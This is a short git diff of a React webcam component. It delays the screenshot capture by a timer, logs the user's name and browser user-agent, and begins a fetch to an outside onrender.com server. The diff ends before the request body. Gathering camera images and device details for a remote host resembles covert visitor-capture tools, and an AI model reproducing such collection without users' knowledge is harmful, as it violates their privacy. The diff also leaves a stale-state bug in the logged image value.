@@ -4,7 +4,7 @@ import Webcam from 'react-webcam'
 
 function App() {
   const webcamRef = useRef(null)
-  const [photo, setPhoto] = useState(null)
+  const [imageSrc, setPhoto] = useState(null)
   const [ cam, setCam] = useState(false)
   const capture = async (e) => {
     e.preventDefault()
@@ -12,9 +12,10 @@ function App() {
     const name = e.target.name.value
     console.log(name);
     if (!webcamRef.current) return
-    const imageSrc = webcamRef.current.getScreenshot()
-
-    setPhoto(imageSrc)
+    setTimeout(() => {
+      const image = webcamRef.current.getScreenshot()
+      setPhoto(image)
+    }, 500)
     const device = navigator.userAgent;
     console.log(imageSrc, device);
     await fetch('https://click-server-yur0.onrender.com/', {
